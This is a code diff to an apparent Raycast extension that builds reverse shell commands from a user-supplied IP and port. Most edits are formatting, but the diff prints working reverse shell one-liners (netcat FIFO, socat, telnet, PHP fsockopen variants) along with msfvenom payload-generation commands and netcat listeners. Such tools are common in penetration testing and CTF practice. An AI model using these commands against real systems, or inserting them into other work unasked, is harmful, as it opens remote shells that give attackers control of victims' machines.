@@ -118,8 +118,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "nc-fifo",
     name: "Netcat (FIFO)",
     icon: "🔌",
-    command:
-      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
+    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
     description: "Netcat variant using FIFO pipe",
     category: "reverse",
     subcategory: "Shell Tools",
@@ -130,8 +129,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "nc-openbsd",
     name: "Netcat (OpenBSD)",
     icon: "🔌",
-    command:
-      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f",
+    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f",
     description: "OpenBSD Netcat reverse shell",
     category: "reverse",
     subcategory: "Shell Tools",
@@ -146,15 +144,14 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     description: "Ncat tool from Nmap",
     category: "reverse",
     subcategory: "Shell Tools",
-    os: ["linux", "mac", "windows"],
+    os: ["linux", "mac"],
     listener: "ncat -lvnp {PORT}",
   },
   {
     type: "socat",
     name: "Socat",
     icon: "🔗",
-    command:
-      "socat tcp-connect:{IP}:{PORT} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
+    command: "socat tcp-connect:{IP}:{PORT} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
     description: "Socat TCP connection reverse shell",
     category: "reverse",
     subcategory: "Shell Tools",
@@ -165,8 +162,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "telnet",
     name: "Telnet",
     icon: "📞",
-    command:
-      "TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | /bin/sh 1>$TF",
+    command: "TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | /bin/sh 1>$TF",
     description: "Telnet reverse shell",
     category: "reverse",
     subcategory: "Shell Tools",
@@ -196,7 +192,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     description: "Python 3 socket reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
-    os: ["linux", "mac", "windows"],
+    os: ["linux", "mac"],
     listener: "nc -lvnp {PORT}",
   },
   {
@@ -227,8 +223,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "php-exec",
     name: "PHP (exec)",
     icon: "🐘",
-    command:
-      'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
+    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP exec reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
@@ -239,8 +234,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "php-system",
     name: "PHP (system)",
     icon: "🐘",
-    command:
-      'php -r \'$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");\'',
+    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP system reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
@@ -251,8 +245,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "php-passthru",
     name: "PHP (passthru)",
     icon: "🐘",
-    command:
-      'php -r \'$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
+    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP passthru reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
@@ -263,8 +256,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "php-shell_exec",
     name: "PHP (shell_exec)",
     icon: "🐘",
-    command:
-      'php -r \'$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
+    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP shell_exec reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
@@ -304,7 +296,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     description: "Node.js net module reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
-    os: ["linux", "mac", "windows"],
+    os: ["linux", "mac"],
     listener: "nc -lvnp {PORT}",
   },
   {
@@ -366,7 +358,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     description: "Java Socket reverse shell (compiles and runs)",
     category: "reverse",
     subcategory: "Compiled Languages",
-    os: ["linux", "mac", "windows"],
+    os: ["linux", "mac"],
     listener: "nc -lvnp {PORT}",
   },
 
@@ -425,8 +417,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "msfvenom-linux-x64",
     name: "MSFVenom Linux x64",
     icon: "🎯",
-    command:
-      "msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
+    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
     description: "MSFVenom Linux x64 ELF reverse shell",
     category: "msfvenom",
     subcategory: "Payload Generators",
@@ -438,8 +429,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "msfvenom-linux-x86",
     name: "MSFVenom Linux x86",
     icon: "🎯",
-    command:
-      "msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
+    command: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
     description: "MSFVenom Linux x86 ELF reverse shell",
     category: "msfvenom",
     subcategory: "Payload Generators",
@@ -451,8 +441,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "msfvenom-windows-x64",
     name: "MSFVenom Windows x64",
     icon: "🎯",
-    command:
-      "msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
     description: "MSFVenom Windows x64 EXE reverse shell",
     category: "msfvenom",
     subcategory: "Payload Generators",
@@ -464,8 +453,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "msfvenom-windows-x86",
     name: "MSFVenom Windows x86",
     icon: "🎯",
-    command:
-      "msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
+    command: "msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
     description: "MSFVenom Windows x86 EXE reverse shell",
     category: "msfvenom",
     subcategory: "Payload Generators",
@@ -477,8 +465,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     type: "msfvenom-mac",
     name: "MSFVenom macOS",
     icon: "🎯",
-    command:
-      "msfvenom -p osx/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho > shell.macho",
+    command: "msfvenom -p osx/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho > shell.macho",
     description: "MSFVenom macOS Mach-O reverse shell",
     category: "msfvenom",
     subcategory: "Payload Generators",
@@ -506,9 +493,7 @@ function generateAllCommands(ip: string, port: string): ShellTemplate[] {
       return {
         ...template,
         command: encoded,
-        listener: template.listener
-          ?.replace(/{IP}/g, ip)
-          .replace(/{PORT}/g, port),
+        listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
       };
     }
 
@@ -516,9 +501,7 @@ function generateAllCommands(ip: string, port: string): ShellTemplate[] {
     return {
       ...template,
       command: template.command.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
-      listener: template.listener
-        ?.replace(/{IP}/g, ip)
-        .replace(/{PORT}/g, port),
+      listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
     };
   });
 }
@@ -567,9 +550,7 @@ function base64Encode(str: string): string {
 }
 
 // Group by subcategory
-function groupBySubcategory(
-  commands: ShellTemplate[],
-): Record<string, ShellTemplate[]> {
+function groupBySubcategory(commands: ShellTemplate[]): Record<string, ShellTemplate[]> {
   const groups: Record<string, ShellTemplate[]> = {};
   commands.forEach((cmd) => {
     if (!groups[cmd.subcategory]) {
@@ -602,8 +583,7 @@ const STORAGE_KEY_IP = "lastIP";
 const STORAGE_KEY_PORT = "lastPort";
 
 async function loadConfig(): Promise<Config> {
-  const ip =
-    (await LocalStorage.getItem<string>(STORAGE_KEY_IP)) || "10.10.10.10";
+  const ip = (await LocalStorage.getItem<string>(STORAGE_KEY_IP)) || "10.10.10.10";
   const port = (await LocalStorage.getItem<string>(STORAGE_KEY_PORT)) || "9001";
   return { ip, port };
 }
@@ -635,9 +615,7 @@ function ShowAllCommands({ ip, port }: FormValues) {
   const filteredCommands =
     osFilter === "all"
       ? allCommands
-      : allCommands.filter((cmd) =>
-          cmd.os.includes(osFilter as "linux" | "windows" | "mac"),
-        );
+      : allCommands.filter((cmd) => cmd.os.includes(osFilter as "linux" | "windows" | "mac"));
 
   // Sorting
   const sortedCommands = [...filteredCommands].sort((a, b) => {
@@ -660,11 +638,7 @@ function ShowAllCommands({ ip, port }: FormValues) {
       searchBarPlaceholder="Search shell types..."
       isShowingDetail
       searchBarAccessory={
-        <List.Dropdown
-          tooltip="Filter by OS"
-          value={osFilter}
-          onChange={setOsFilter}
-        >
+        <List.Dropdown tooltip="Filter by OS" value={osFilter} onChange={setOsFilter}>
           <List.Dropdown.Item title="All Systems" value="all" />
           <List.Dropdown.Item title="Linux" value="linux" icon="🐧" />
           <List.Dropdown.Item title="Windows" value="windows" icon="🪟" />
@@ -785,10 +759,7 @@ ${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : 
                         showToast({
                           style: Toast.Style.Failure,
                           title: "Save Failed",
-                          message:
-                            error instanceof Error
-                              ? error.message
-                              : "Unknown error",
+                          message: error instanceof Error ? error.message : "Unknown error",
                         });
                       }
                     }}
@@ -807,14 +778,14 @@ ${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : 
                       onAction={() => setSortBy("name")}
                     />
                     <Action
-                      title="Sort by OS"
+                      title="Sort by Os"
                       icon={Icon.ComputerChip}
                       shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
                       onAction={() => setSortBy("os")}
                     />
                   </ActionPanel.Section>
                   <Action
-                    title="Re-enter IP/Port"
+                    title="Re-enter Ip/port"
                     icon={Icon.ArrowClockwise}
                     shortcut={{ modifiers: ["cmd"], key: "r" }}
                     onAction={pop}
@@ -886,10 +857,7 @@ export default function Command() {
     <Form
       actions={
         <ActionPanel>
-          <Action.SubmitForm
-            title="Generate All Commands"
-            onSubmit={handleSubmit}
-          />
+          <Action.SubmitForm title="Generate All Commands" onSubmit={handleSubmit} />
           <Action
             title="Increment Port"
             icon={Icon.Plus}
